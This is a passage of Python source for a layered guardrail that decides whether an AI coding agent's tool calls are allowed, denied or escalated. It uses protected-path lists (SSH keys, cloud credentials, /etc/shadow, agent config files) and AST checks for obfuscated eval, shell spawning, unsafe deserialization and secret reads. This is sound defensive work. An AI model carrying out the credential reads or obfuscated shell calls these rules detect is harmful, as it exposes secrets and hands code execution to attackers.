"""Layered Decision Engine & Structural Code/Shell Parsers (Architecture Layers 0-3).

Separates decisions cleanly by nature rather than conflating rules with ML:
  - Layer 0 (Policy in Code): Tool risk class, protected constitutional paths, and explicit permissions.
  - Layer 1 (Structural Parsers): Real Python AST inspection (with context dedent/wrapping),
    language-aware diff handling (skipping non-Python AST parsing), and shlex-based shell parsing.
  - Layer 2 (Calibrated Classifier Boundary): Micro-classifier inference with Split-Conformal sets.
  - Layer 3 (LLM / Human Escalation): Unknown, destructive, or ambiguous actions escalate.

Contract:
  decide(input_data, context=None) -> {
      decision: "allow" | "deny" | "escalate",
      label: str,
      prediction_set: list[str],
      reason_code: str,
      layer: int,
      model_version: str,
      rules_version: str,
      latency_ms: float,
  }
"""

from __future__ import annotations

import ast
import fnmatch
import hashlib
import importlib
import json
import logging
import math
import os
import posixpath
import re
import shlex
import textwrap
import time
from collections import Counter, deque
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Deque, Dict, List, Optional, Sequence, Set, Tuple, Union

log = logging.getLogger(__name__)

RULES_VERSION = "2.1.0-layered-structural"
DEFAULT_MODEL_VERSION = "analytical-wsp-v2.1"
DEFAULT_JOURNAL_PATH = Path(__file__).resolve().parents[1] / "memory" / "decision_journal.jsonl"
_DECISION_RING_BUFFER: Deque[Dict[str, Any]] = deque(maxlen=500)

# Tool risk taxonomy (Layer 0)
TOOL_RISK_CLASSES: Dict[str, str] = {
    # Read-only operations
    "read_file": "READ_ONLY",
    "repo_read": "READ_ONLY",
    "list_dir": "READ_ONLY",
    "search_code": "READ_ONLY",
    "git_status": "READ_ONLY",
    "git_log": "READ_ONLY",
    "git_diff": "READ_ONLY",
    "microbrain_consult": "READ_ONLY",
    "microbrain_status": "READ_ONLY",
    "vsa_query": "READ_ONLY",
    "memory_recall": "READ_ONLY",
    "blackboard_fetch": "READ_ONLY",
    "knowledge_search": "READ_ONLY",
    # Reversible mutations
    "write_file": "REVERSIBLE_WRITE",
    "repo_write": "REVERSIBLE_WRITE",
    "edit_file": "REVERSIBLE_WRITE",
    "str_replace_editor": "REVERSIBLE_WRITE",
    "apply_patch": "REVERSIBLE_WRITE",
    "format_code": "REVERSIBLE_WRITE",
    # External / process execution
    "run_command": "EXTERNAL_ACTION",
    "execute_shell": "EXTERNAL_ACTION",
    "run_tests": "EXTERNAL_ACTION",
    "pytest_runner": "EXTERNAL_ACTION",
    "git_commit": "EXTERNAL_ACTION",
    # Irreversible / high-impact operations
    "git_push": "IRREVERSIBLE_DESTRUCTIVE",
    "delete_file": "IRREVERSIBLE_DESTRUCTIVE",
    "drop_db": "IRREVERSIBLE_DESTRUCTIVE",
}

DEFAULT_PROTECTED_PATTERNS: Tuple[str, ...] = (
    "memory/bible.md",
    "bible.md",
    "constitution/",
    "immutable_axioms",
    "aboriginal",
    "sacred_site",
    "kinship",
    "totem_guidelines",
    "integrity_seal.json",
    "integrity_manifest",
    # Universal SWE security-critical asset paths & agent control plane
    ".env",
    ".git/config",
    ".git/hooks",
    ".gitmodules",
    ".github/workflows/",
    ".gitlab-ci.yml",
    ".pre-commit-config.yaml",
    ".ssh/",
    "id_rsa",
    "id_ed25519",
    "credentials.json",
    "secrets.yaml",
    "secrets.json",
    ".aws/credentials",
    ".aws/config",
    ".kube/config",
    ".docker/config.json",
    "/etc/passwd",
    "/etc/shadow",
    "/etc/sudoers",
    ".claude/",
    ".claude",
    ".cursor/",
    ".cursor",
    ".cursorrules",
    ".windsurfrules",
    ".codex/",
    ".codex",
    "claude.md",
    "agents.md",
    ".claude/settings.json",
    ".claude/settings.local.json",
    ".claude/hooks",
    ".mcp.json",
    ".cursor/mcp.json",
    ".vscode/tasks.json",
    ".vscode/settings.json",
)

_PROTECTED_EXACT_BASENAMES: Set[str] = {
    ".env",
    ".npmrc",
    ".netrc",
    ".pypirc",
    ".gitconfig",
    ".bashrc",
    ".zshrc",
    ".profile",
    ".bash_profile",
    ".zprofile",
    "id_rsa",
    "id_ed25519",
    "credentials.json",
    "secrets.yaml",
    "secrets.json",
    "claude.md",
    "agents.md",
    ".cursorrules",
    ".windsurfrules",
    ".gitlab-ci.yml",
    ".pre-commit-config.yaml",
    ".gitmodules",
}


DEFAULT_ALLOWED_AST_IMPORTS: Tuple[str, ...] = (
    "abc", "collections", "dataclasses", "datetime", "enum",
    "functools", "itertools", "json", "math", "pathlib",
    "re", "statistics", "typing",
)


@dataclass
class PolicyConfig:
    """Configurable security policy without hardcoded domain dogma."""

    protected_patterns: Tuple[str, ...] = DEFAULT_PROTECTED_PATTERNS
    require_approval_for_external: bool = False
    require_approval_for_irreversible: bool = True
    require_full_source_for_allow: bool = False
    escalation_timeout_sec: int = 300
    default_on_escalation_timeout: str = "deny"
    max_diff_lines: int = 480
    strict_ast_allowlist: bool = False
    allowed_ast_imports: Tuple[str, ...] = DEFAULT_ALLOWED_AST_IMPORTS
    profile: str = "strict"  # "strict" (default) or "dev" (permits routine dev ops on non-protected files)

    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> PolicyConfig:
        """Construct PolicyConfig from a dictionary (e.g., parsed JSON/YAML)."""
        valid_fields = cls.__dataclass_fields__
        kwargs: Dict[str, Any] = {}
        for k, v in data.items():
            if k in valid_fields:
                if k in ("protected_patterns", "allowed_ast_imports") and isinstance(v, (list, tuple, set)):
                    kwargs[k] = tuple(str(x) for x in v)
                else:
                    kwargs[k] = v
        return cls(**kwargs)

    @classmethod
    def from_file(cls, path: str | Path) -> PolicyConfig:
        """Load PolicyConfig from a JSON file (or YAML if PyYAML/ruamel is installed)."""
        p = Path(path).expanduser().resolve()
        if not p.is_file():
            raise FileNotFoundError(f"Policy file not found: {p}")
        raw = p.read_text(encoding="utf-8")
        if p.suffix.lower() in (".yaml", ".yml"):
            try:
                import yaml
                loaded = yaml.safe_load(raw)
            except ImportError:
                # Lightweight pure-Python fallback for key: value / list YAML without PyYAML dependency
                loaded = cls._parse_simple_yaml(raw)
        else:
            loaded = json.loads(raw)
        if not isinstance(loaded, dict):
            raise ValueError(f"Expected dict in policy file, got {type(loaded).__name__}")
        return cls.from_dict(loaded)

    @staticmethod
    def _parse_simple_yaml(raw: str) -> Dict[str, Any]:
        """Simple YAML parser fallback for string/bool/int/list fields when pyyaml is absent."""
        res: Dict[str, Any] = {}
        curr_list_key: Optional[str] = None
        for line in raw.splitlines():
            line_str = line.split("#", 1)[0].rstrip()
            if not line_str.strip():
                continue
            indent = len(line_str) - len(line_str.lstrip())
            stripped = line_str.strip()
            if stripped.startswith("- ") and curr_list_key and indent > 0:
                val = stripped[2:].strip().strip("\"'")
                res[curr_list_key].append(val)
                continue
            if ":" in stripped:
                curr_list_key = None
                k, v = stripped.split(":", 1)
                k = k.strip()
                v = v.strip().strip("\"'")
                if not v:
                    curr_list_key = k
                    res[k] = []
                elif v.lower() == "true":
                    res[k] = True
                elif v.lower() == "false":
                    res[k] = False
                elif v.isdigit():
                    res[k] = int(v)
                else:
                    res[k] = v
        return res


DEFAULT_POLICY = PolicyConfig()


def is_protected_path(path_str: Optional[str], policy: Optional[PolicyConfig] = None) -> bool:
    """Return True if path points to a constitutional, credential, or security-critical asset.

    Protects both custom constitutional patterns and standard SWE secrets/hooks/control-plane
    files (`.env*`, `.git/hooks`, `.ssh/id_rsa`, `.aws/credentials`, `.claude/settings.json`,
    `.mcp.json`) while avoiding false positives on generic code/math paths like
    `src/math/axioms.py` or `src/env_loader.py`.
    """
    if not path_str:
        return False
    raw = str(path_str)
    if "\x00" in raw:
        return True
    cfg = policy or DEFAULT_POLICY
    normalized = raw.replace("\\", "/").strip().lower()
    raw_segments = [seg for seg in normalized.split("/") if seg]
    if ".env" in raw_segments:
        return True

    if normalized.startswith("~/"):
        tail = posixpath.normpath(normalized[2:])
        norm_path = "~/" + tail if tail != "." else "~/"
    else:
        norm_path = posixpath.normpath(normalized)
    basename = Path(norm_path).name

    if basename == ".env" or basename.startswith(".env.") or basename in _PROTECTED_EXACT_BASENAMES:
        return True
    clean_target = norm_path.strip("/")
    if any(clean_target == pat.strip("/").lower() for pat in cfg.protected_patterns):
        return True

    # Glob and wildcard pattern matching (supporting wildcards anywhere in the path, e.g. .e?, .ss*, .s?h)
    if any(ch in normalized for ch in "*?["):
        # Guard against false positives from broad globs:
        #   - Pure wildcards: *, ?, src/* — basename starts with a wildcard char
        #   - Extension globs: *.md, *.txt — also start with '*', would match custom patterns like 'bible.md'
        #
        # Legitimate protective globs (.en?, .ss*, .s?h) ALWAYS start with '.' (a dotfile/dotdir prefix).
        # Broad/benign globs (*, *.md, src/*) start with '*', '?', or an alnum char.
        # So: skip the "user's glob matches a protected pattern" checks when the top-level
        # normalized path does NOT start with '.', '~/.', or contain only wildcard chars.
        # We still run checks for targeted globs like .en?, .ss*/config.
        normalized_stripped = normalized.lstrip("/")
        path_is_targeted_dotglob = normalized_stripped.startswith(".") or normalized_stripped.startswith("~/.")
        normalized_is_pure_wildcard = normalized and all(ch in "*?[/" for ch in normalized)

        if path_is_targeted_dotglob and not normalized_is_pure_wildcard:
            # Match against exact basenames (user's path is a targeted wildcard matching a protected name)
            if any(fnmatch.fnmatch(sens, basename) for sens in _PROTECTED_EXACT_BASENAMES):
                return True
            # Match against all protected patterns and directories
            for pat in cfg.protected_patterns:
                cpat = pat.strip("/").lower()
                if not cpat:
                    continue
                if fnmatch.fnmatch(cpat, basename) or fnmatch.fnmatch(cpat, clean_target) or fnmatch.fnmatch(pat.lower(), normalized):
                    return True
                # Also handle trailing slash variations (e.g. .ss*/ vs .ssh)
                if fnmatch.fnmatch(cpat + "/", normalized) or fnmatch.fnmatch(cpat, normalized.rstrip("/")):
                    return True
        # Match wildcard intermediate directory components (e.g. .ss*/config matching .ssh/...)
        norm_no_home = normalized[2:] if normalized.startswith("~/") else normalized
        segs = norm_no_home.strip("/").split("/")
        for i in range(1, len(segs) + 1):
            subpath = "/".join(segs[:i]).strip("/")
            seg = segs[i - 1]
            # Skip segments that are pure wildcards (*, ?) or broad extension globs (*.md, *.txt):
            # these would match arbitrary protected names via fnmatch(cpat, seg).
            # Legitimate targeted globs (.en?, .ss*) always start with '.', never with '*' or '?'.
            if seg and (all(ch in "*?[" for ch in seg) or seg[0] in "*?["):
                continue
            for pat in cfg.protected_patterns:
                cpat = pat.strip("/").lower()
                if not cpat:
                    continue
                if fnmatch.fnmatch(cpat, subpath) or fnmatch.fnmatch(cpat, seg):
                    return True
            for sens in _PROTECTED_EXACT_BASENAMES:
                if fnmatch.fnmatch(sens, seg):
                    return True

    norm_segments = [seg for seg in norm_path.strip("/").split("/") if seg]
    for pat in cfg.protected_patterns:
        if pat == ".env":
            continue
        clean_pat = pat.strip("/").lower()
        if not clean_pat:
            continue
        if "/" in clean_pat:
            pat_segs = [seg for seg in clean_pat.split("/") if seg]
            plen = len(pat_segs)
            for idx in range(max(0, len(norm_segments) - plen + 1)):
                if norm_segments[idx : idx + plen] == pat_segs:
                    return True
            for idx in range(max(0, len(raw_segments) - plen + 1)):
                if raw_segments[idx : idx + plen] == pat_segs:
                    return True
        elif clean_pat.startswith("."):
            if clean_pat in norm_segments or clean_pat in raw_segments:
                return True
        elif "." in clean_pat:
            if basename == clean_pat or clean_pat in norm_segments or clean_pat in raw_segments:
                return True
        else:
            if clean_pat in norm_path or clean_pat in raw_segments:
                return True
        if norm_path == clean_pat or normalized == clean_pat:
            return True
    return False


def evaluate_layer0_policy(
    tool_name: str,
    target_path: Optional[str] = None,
    policy: Optional[PolicyConfig] = None,
) -> Dict[str, Any]:
    """Evaluate Layer 0 deterministic policy (risk class + protected boundaries)."""
    cfg = policy or DEFAULT_POLICY
    clean_tool = str(tool_name or "").strip().lower()
    risk_class = TOOL_RISK_CLASSES.get(clean_tool, "EXTERNAL_ACTION")

    is_write = risk_class in ("REVERSIBLE_WRITE", "IRREVERSIBLE_DESTRUCTIVE", "EXTERNAL_ACTION")
    if target_path and is_protected_path(target_path, cfg):
        if is_write or clean_tool in ("", "apply_patch"):
            return {
                "decision": "deny",
                "risk_class": risk_class,
                "reason_code": "layer0_protected_path_veto",
                "protected_path": target_path,
            }
        return {
            "decision": "escalate",
            "risk_class": risk_class,
            "reason_code": "layer0_protected_path_read_requires_confirmation",
            "protected_path": target_path,
        }

    if risk_class == "IRREVERSIBLE_DESTRUCTIVE" and cfg.require_approval_for_irreversible:
        return {
            "decision": "escalate",
            "risk_class": risk_class,
            "reason_code": "layer0_irreversible_requires_confirmation",
        }

    if risk_class == "EXTERNAL_ACTION" and cfg.require_approval_for_external:
        return {
            "decision": "escalate",
            "risk_class": risk_class,
            "reason_code": "layer0_external_requires_confirmation",
        }

    return {
        "decision": "allow",
        "risk_class": risk_class,
        "reason_code": "layer0_policy_pass",
    }


def _parse_python_with_context(code_text: str) -> Optional[ast.AST]:
    """Parse Python code or hunk fragment by wrapping in valid block contexts if needed."""
    if not code_text.strip():
        return ast.parse("")

    candidates = [code_text]

    # Indented hunk or mixed leading spaces from synthetic snippet
    dedented = textwrap.dedent(code_text)
    if dedented != code_text:
        candidates.append(dedented)

    # Function body hunk (return, yield, etc.)
    indented_for_fn = textwrap.indent(dedented, "    ")
    candidates.append(f"def _hunk_ctx():\n{indented_for_fn}")

    # Exception handler hunk (`except ...:` / `finally:`)
    candidates.append(f"try:\n    pass\n{dedented}")

    # Branch continuation hunk (`elif ...:` / `else:`)
    candidates.append(f"if True:\n    pass\n{dedented}")

    # Trailing block header in 3-line unified-diff context (e.g. `else:` at end of hunk)
    last_non_empty = next((ln for ln in reversed(dedented.splitlines()) if ln.strip()), "")
    if last_non_empty.rstrip().endswith(":"):
        lead = len(last_non_empty) - len(last_non_empty.lstrip(" "))
        pass_line = " " * (lead + 4) + "pass"
        candidates.append(f"{dedented}\n{pass_line}")
        candidates.append(f"if True:\n    pass\n{dedented}\n{pass_line}")
        candidates.append(f"def _hunk_ctx():\n{indented_for_fn}\n    {pass_line}")

    for cand in candidates:
        try:
            return ast.parse(cand)
        except SyntaxError:
            continue
    return None


def _const_str(node: ast.AST) -> Optional[str]:
    """Resolve constant string or concatenated string literals (`'sys' + 'tem'`)."""
    if isinstance(node, ast.Constant) and isinstance(node.value, str):
        return node.value
    if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
        left = _const_str(node.left)
        right = _const_str(node.right)
        if left is not None and right is not None:
            return left + right
    return None


class _SecurityASTVisitor(ast.NodeVisitor):
    """AST security analyzer catching direct, aliased, subscript, encoded, and getattr sinks."""

    DANGEROUS_BUILTINS = {"eval", "exec", "compile", "__import__"}
    DANGEROUS_ATTRS = {"system", "popen", "rmtree", "loads", "load", "unsafe_load", "spawn"}
    DANGEROUS_MODULES = {
        "os", "subprocess", "shutil", "pickle", "cpickle", "marshal", "shelve",
        "pty", "builtins", "__builtins__", "importlib",
    }
    SUBSCRIPT_SCOPE_NAMES = {"__builtins__", "builtins", "globals", "locals", "vars"}

    def __init__(self) -> None:
        self.findings: List[str] = []
        self.structural_findings: List[Dict[str, Any]] = []
        self.scope_stack: List[str] = []
        self.dangerous_aliases: Set[str] = set()
        self.module_aliases: Dict[str, str] = {}
        self.decoded_vars: Set[str] = set()
        self.has_network_sink: bool = False
        self.has_env_secret_read: bool = False

    def _record_finding(self, rule: str, node: ast.AST, target_symbol: str = "") -> None:
        self.findings.append(rule)
        scope = "::".join(self.scope_stack) if self.scope_stack else "module"
        self.structural_findings.append({
            "rule": rule,
            "scope": scope,
            "lineno": getattr(node, "lineno", 0),
            "col_offset": getattr(node, "col_offset", 0),
            "node_type": type(node).__name__,
            "symbol": target_symbol,
        })

    def visit_FunctionDef(self, node: ast.FunctionDef) -> None:
        self.scope_stack.append(node.name)
        self.generic_visit(node)
        self.scope_stack.pop()

    def visit_AsyncFunctionDef(self, node: ast.AsyncFunctionDef) -> None:
        self.scope_stack.append(node.name)
        self.generic_visit(node)
        self.scope_stack.pop()

    def visit_ClassDef(self, node: ast.ClassDef) -> None:
        self.scope_stack.append(node.name)
        self.generic_visit(node)
        self.scope_stack.pop()

    @staticmethod
    def _attr_chain(node: ast.AST) -> str:
        parts: List[str] = []
        cur = node
        while isinstance(cur, ast.Attribute):
            parts.append(cur.attr)
            cur = cur.value
        if isinstance(cur, ast.Name):
            parts.append(cur.id)
        return ".".join(reversed(parts)).lower()

    @staticmethod
    def _is_decode_call(node: ast.AST) -> bool:
        """Return True if node represents base64/codecs/hex decoding (including `.decode()` chain)."""
        cur = node
        if (
            isinstance(cur, ast.Call)
            and isinstance(cur.func, ast.Attribute)
            and cur.func.attr == "decode"
            and isinstance(cur.func.value, ast.Call)
        ):
            cur = cur.func.value
        if isinstance(cur, ast.Call) and isinstance(cur.func, ast.Attribute):
            attr = cur.func.attr
            base = cur.func.value.id.lower() if isinstance(cur.func.value, ast.Name) else ""
            if (base in {"base64", "codecs"} and attr in {"b64decode", "urlsafe_b64decode", "decodebytes", "decode"}) or (
                base == "bytes" and attr == "fromhex"
            ):
                return True
        return False

    @classmethod
    def _check_subscript_lookup(cls, node: ast.Subscript) -> Optional[str]:
        val = node.value
        is_scope = False
        if isinstance(val, ast.Name) and val.id in cls.SUBSCRIPT_SCOPE_NAMES:
            is_scope = True
        elif isinstance(val, ast.Call) and isinstance(val.func, ast.Name) and val.func.id in cls.SUBSCRIPT_SCOPE_NAMES:
            is_scope = True
        if not is_scope:
            return None
        key = _const_str(node.slice)
        if key is None or key in cls.DANGEROUS_BUILTINS or key in cls.DANGEROUS_ATTRS or key in {"getattr", "import_module", "open"}:
            return key or "<dynamic>"
        return None

    def _uses_decoded_payload(self, args: List[ast.AST]) -> bool:
        for arg in args:
            if isinstance(arg, ast.Name) and arg.id in self.decoded_vars:
                return True
            if self._is_decode_call(arg):
                return True
            for sub in ast.walk(arg):
                if isinstance(sub, ast.Name) and sub.id in self.decoded_vars:
                    return True
                if self._is_decode_call(sub):
                    return True
        return False

    def visit_Import(self, node: ast.Import) -> None:
        for alias in node.names:
            root_mod = alias.name.split(".")[0].lower()
            as_name = alias.asname or alias.name.split(".")[0]
            if root_mod in self.DANGEROUS_MODULES:
                self.module_aliases[as_name] = root_mod
        self.generic_visit(node)

    def visit_ImportFrom(self, node: ast.ImportFrom) -> None:
        mod = (node.module or "").split(".")[0].lower()
        for alias in node.names:
            name_lower = alias.name.lower()
            as_name = alias.asname or alias.name
            if name_lower in self.DANGEROUS_BUILTINS or (
                mod in self.DANGEROUS_MODULES
                and name_lower in {"system", "popen", "rmtree", "run", "call", "check_output", "loads", "load", "remove", "unlink", "import_module"}
            ):
                self.dangerous_aliases.add(as_name)
        self.generic_visit(node)

    def visit_Assign(self, node: ast.Assign) -> None:
        self._check_alias_assignment(node.targets, node.value)
        self.generic_visit(node)

    def visit_AnnAssign(self, node: ast.AnnAssign) -> None:
        if node.value is not None:
            self._check_alias_assignment([node.target], node.value)
        self.generic_visit(node)

    def _check_alias_assignment(self, targets: List[ast.AST], value: ast.AST) -> None:
        if self._is_decode_call(value):
            for tgt in targets:
                if isinstance(tgt, ast.Name):
                    self.decoded_vars.add(tgt.id)

        is_dangerous_rhs = False
        if isinstance(value, ast.Name) and (value.id in self.DANGEROUS_BUILTINS or value.id in self.dangerous_aliases):
            is_dangerous_rhs = True
        elif isinstance(value, ast.Attribute) and value.attr in {"system", "popen", "rmtree", "loads", "run", "call", "import_module"}:
            is_dangerous_rhs = True
        elif isinstance(value, ast.Call) and isinstance(value.func, ast.Name) and value.func.id in {"getattr", "__import__"}:
            is_dangerous_rhs = True
        elif isinstance(value, ast.Subscript):
            sub_key = self._check_subscript_lookup(value)
            if sub_key is not None:
                is_dangerous_rhs = True
                self.findings.append(f"obfuscated_subscript_builtin:{sub_key}")

        if is_dangerous_rhs:
            for tgt in targets:
                if isinstance(tgt, ast.Name):
                    self.dangerous_aliases.add(tgt.id)
                    self._record_finding(f"dangerous_alias:{tgt.id}", tgt, tgt.id)

    def visit_Subscript(self, node: ast.Subscript) -> None:
        sub_key = self._check_subscript_lookup(node)
        if sub_key is not None:
            flag = f"obfuscated_subscript_builtin:{sub_key}"
            if flag not in self.findings:
                self._record_finding(flag, node, str(sub_key))
        if isinstance(node.value, ast.Attribute) and node.value.attr == "environ":
            env_k = _const_str(node.slice)
            if env_k and _SENSITIVE_ENV_VAR_RE.search(env_k):
                self.has_env_secret_read = True
        self.generic_visit(node)

    _MAX_FOLD_DEPTH = 32

    @classmethod
    def _fold_str(cls, node: ast.AST, depth: int = 0) -> Optional[str]:
        """Constant-fold literal-only string building: `'a' + 'b'`, f-strings, `''.join([...])`."""
        if depth > cls._MAX_FOLD_DEPTH:
            return None
        if isinstance(node, ast.Constant) and isinstance(node.value, str):
            return node.value
        if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
            left = cls._fold_str(node.left, depth + 1)
            if left is None:
                return None
            right = cls._fold_str(node.right, depth + 1)
            return None if right is None else left + right
        if isinstance(node, ast.FormattedValue) and node.conversion == -1 and node.format_spec is None:
            return cls._fold_str(node.value, depth + 1)
        if isinstance(node, ast.JoinedStr):
            parts: List[str] = []
            for val in node.values:
                piece = cls._fold_str(val, depth + 1)
                if piece is None:
                    return None
                parts.append(piece)
            return "".join(parts)
        if (
            isinstance(node, ast.Call)
            and isinstance(node.func, ast.Attribute)
            and node.func.attr == "join"
            and len(node.args) == 1
            and not node.keywords
            and isinstance(node.args[0], (ast.List, ast.Tuple))
        ):
            sep = cls._fold_str(node.func.value, depth + 1)
            if sep is None:
                return None
            items: List[str] = []
            for elt in node.args[0].elts:
                piece = cls._fold_str(elt, depth + 1)
                if piece is None:
                    return None
                items.append(piece)
            return sep.join(items)
        return None

    def _check_folded_secret(self, node: ast.AST) -> None:
        """Flag credentials split across literals to evade line-level secret regexes."""
        if "obfuscated_secret_concatenation" in self.findings:
            return
        folded = self._fold_str(node)
        if folded and len(folded) >= 12 and any(p.search(folded) for p in _SECRET_TOKEN_REGEXES):
            self._record_finding("obfuscated_secret_concatenation", node)

    def visit_BinOp(self, node: ast.BinOp) -> None:
        if isinstance(node.op, ast.Add):
            self._check_folded_secret(node)
        self.generic_visit(node)

    def visit_JoinedStr(self, node: ast.JoinedStr) -> None:
        self._check_folded_secret(node)
        self.generic_visit(node)

    def visit_Call(self, node: ast.Call) -> None:
        func = node.func
        if isinstance(func, ast.Attribute) and func.attr == "join":
            self._check_folded_secret(node)

        # Case 1: Direct or aliased name call (`eval(...)`, `run(...)`)
        if isinstance(func, ast.Name):
            if func.id in self.DANGEROUS_BUILTINS:
                self._record_finding(f"dangerous_builtin:{func.id}", node, func.id)
                if self._uses_decoded_payload(node.args):
                    self._record_finding("obfuscated_encoded_payload", node, func.id)
            elif func.id in self.dangerous_aliases:
                self._record_finding(f"aliased_dangerous_call:{func.id}", node, func.id)
                if self._uses_decoded_payload(node.args):
                    self._record_finding("obfuscated_encoded_payload", node, func.id)
            elif func.id == "getattr":
                self._check_getattr(node)
            elif func.id == "open" and node.args:
                open_path = self._fold_str(node.args[0]) or _const_str(node.args[0])
                if open_path and is_protected_path(open_path):
                    self._record_finding("ast_protected_file_access", node, open_path)

        # Case 2: Obfuscated dynamic dispatch `getattr(os, 'sys' + 'tem')(...)`
        elif isinstance(func, ast.Call):
            if isinstance(func.func, ast.Name) and func.func.id == "getattr":
                self._check_getattr(func)
                self._record_finding("obfuscated_dynamic_invocation:getattr", node, "getattr")
            if self._uses_decoded_payload(node.args):
                self._record_finding("obfuscated_encoded_payload", node)

        # Case 2b: Direct subscript invocation (`globals()['eval'](...)`, `__builtins__['exec'](...)`)
        elif isinstance(func, ast.Subscript):
            sub_key = self._check_subscript_lookup(func)
            if sub_key is not None:
                self._record_finding(f"obfuscated_dynamic_subscript_call:{sub_key}", node, str(sub_key))
                if self._uses_decoded_payload(node.args):
                    self._record_finding("obfuscated_encoded_payload", node)

        # Case 3: Attribute call (`os.system`, `subprocess.run`, `shutil.rmtree`, `pickle.loads`, ...)
        elif isinstance(func, ast.Attribute):
            attr = func.attr
            chain = self._attr_chain(func)
            base_name = func.value.id.lower() if isinstance(func.value, ast.Name) else ""
            resolved_mod = self.module_aliases.get(base_name, base_name)

            if chain in {
                "urllib.request.urlopen",
                "requests.post",
                "requests.get",
                "requests.put",
                "requests.request",
                "httpx.post",
                "httpx.get",
                "httpx.put",
                "httpx.request",
                "socket.create_connection",
                "http.client.httpconnection",
                "http.client.httpsconnection",
            }:
                self.has_network_sink = True

            if attr in {"read_text", "read_bytes", "open"} and isinstance(func.value, ast.Call):
                if func.value.args:
                    p_str = self._fold_str(func.value.args[0]) or _const_str(func.value.args[0])
                    if p_str and is_protected_path(p_str):
                        self._record_finding("ast_protected_file_access", node, p_str)

            if resolved_mod in {"io", "codecs", "os"} and attr == "open" and node.args:
                p_str = self._fold_str(node.args[0]) or _const_str(node.args[0])
                if p_str and is_protected_path(p_str):
                    self._record_finding("ast_protected_file_access", node, p_str)
            elif resolved_mod == "fileinput" and attr == "input" and node.args:
                arg0 = node.args[0]
                cand_nodes = list(arg0.elts) if isinstance(arg0, (ast.List, ast.Tuple)) else [arg0]
                for cn in cand_nodes:
                    p_str = self._fold_str(cn) or _const_str(cn)
                    if p_str and is_protected_path(p_str):
                        self._record_finding("ast_protected_file_access", node, p_str)

            if attr in {"getenv", "get"} and node.args:
                env_k = _const_str(node.args[0])
                if env_k and _SENSITIVE_ENV_VAR_RE.search(env_k):
                    self.has_env_secret_read = True

            if attr in {"eval", "exec", "system", "popen"}:
                sym = f"{resolved_mod}.{attr}" if resolved_mod else attr
                self._record_finding(f"dangerous_method:{sym}", node, sym)
                if self._uses_decoded_payload(node.args):
                    self._record_finding("obfuscated_encoded_payload", node, sym)
            elif resolved_mod == "importlib" and attr == "import_module":
                self._record_finding("dynamic_import:importlib.import_module", node, "importlib.import_module")
            elif resolved_mod == "pty" and attr in {"spawn", "fork"}:
                self._record_finding(f"dangerous_pty_call:pty.{attr}", node, f"pty.{attr}")
            elif resolved_mod == "ctypes" and attr in {"CDLL", "PyDLL", "OleDLL", "WinDLL", "LibraryLoader"}:
                self._record_finding(f"dangerous_ctypes_call:ctypes.{attr}", node, f"ctypes.{attr}")
            elif chain.startswith(("ctypes.cdll.", "ctypes.windll.", "ctypes.oledll.", "ctypes.pythonapi.")):
                self._record_finding(f"dangerous_ctypes_call:{chain}", node, chain)
            elif resolved_mod == "subprocess" or (isinstance(func.value, ast.Name) and func.value.id == "subprocess"):
                if attr in {"run", "Popen", "call", "check_output", "check_call", "getoutput", "getstatusoutput"}:
                    has_shell_true = attr in {"getoutput", "getstatusoutput"} or any(
                        kw.arg == "shell" and isinstance(kw.value, ast.Constant) and kw.value.value is True
                        for kw in node.keywords
                    )
                    rule_tag = "subprocess_shell_true" if has_shell_true else f"subprocess_call:{attr}"
                    self._record_finding(rule_tag, node, f"subprocess.{attr}")
                    if self._uses_decoded_payload(node.args):
                        self._record_finding("obfuscated_encoded_payload", node, f"subprocess.{attr}")
            elif resolved_mod == "shutil" or (isinstance(func.value, ast.Name) and func.value.id == "shutil"):
                if attr == "rmtree":
                    self._record_finding("destructive_fs_call:shutil.rmtree", node, "shutil.rmtree")
            elif resolved_mod == "os" or (isinstance(func.value, ast.Name) and func.value.id == "os"):
                if attr in {
                    "system", "popen", "remove", "unlink", "rmdir",
                    "execl", "execle", "execlp", "execlpe", "execv", "execve", "execvp", "execvpe",
                    "spawnl", "spawnle", "spawnlp", "spawnlpe", "spawnv", "spawnve", "spawnvp", "spawnvpe",
                    "posix_spawn", "posix_spawnp",
                }:
                    self._record_finding(f"dangerous_os_call:os.{attr}", node, f"os.{attr}")
            elif resolved_mod in {"pickle", "cpickle", "marshal", "shelve"}:
                if attr in {"loads", "load", "open"}:
                    self._record_finding(f"unsafe_deserialization:{resolved_mod}.{attr}", node, f"{resolved_mod}.{attr}")
            elif resolved_mod == "yaml" and attr in {"unsafe_load", "load"}:
                has_safe_loader = any(
                    kw.arg == "Loader" and isinstance(kw.value, (ast.Name, ast.Attribute)) and "Safe" in ast.dump(kw.value)
                    for kw in node.keywords
                )
                if not has_safe_loader:
                    self._record_finding(f"unsafe_yaml_load:yaml.{attr}", node, f"yaml.{attr}")

        self.generic_visit(node)

    def _check_getattr(self, node: ast.Call) -> None:
        target_obj = ""
        if node.args:
            if isinstance(node.args[0], ast.Name):
                target_obj = node.args[0].id.lower()
            elif isinstance(node.args[0], ast.Call) and isinstance(node.args[0].func, ast.Name):
                target_obj = node.args[0].func.id.lower()
        attr_str = _const_str(node.args[1]) if len(node.args) >= 2 else None
        if target_obj in self.DANGEROUS_MODULES or target_obj in self.SUBSCRIPT_SCOPE_NAMES:
            self._record_finding(f"obfuscated_getattr:{target_obj}.{attr_str or '<dynamic>'}", node, target_obj)
        elif attr_str in {"system", "popen", "eval", "exec", "__import__", "rmtree"}:
            if len(node.args) >= 2 and isinstance(node.args[1], ast.BinOp):
                self._record_finding(f"obfuscated_getattr_concat:{attr_str}", node, attr_str)
            else:
                self._record_finding(f"obfuscated_getattr_sink:{attr_str}", node, attr_str)


def _extract_defs_from_lines(lines: List[str]) -> Tuple[Dict[str, Tuple[int, int]], int]:
    """Parse function/class signatures (`name -> (min_pos, max_pos)` or `(-1, -1)` for class) & try count."""
    if not lines:
        return {}, 0
    cleaned: List[str] = []
    for idx, ln in enumerate(lines):
        cleaned.append(ln)
        stripped = ln.strip()
        if re.match(r"^(?:async\s+)?def\s+\w+\s*\(.*\)\s*(?:->\s*[^:]+)?:\s*$", stripped) or re.match(r"^class\s+\w+.*:\s*$", stripped):
            next_ln = lines[idx + 1] if idx + 1 < len(lines) else ""
            next_indent = len(next_ln) - len(next_ln.lstrip(" "))
            cur_indent = len(ln) - len(ln.lstrip(" "))
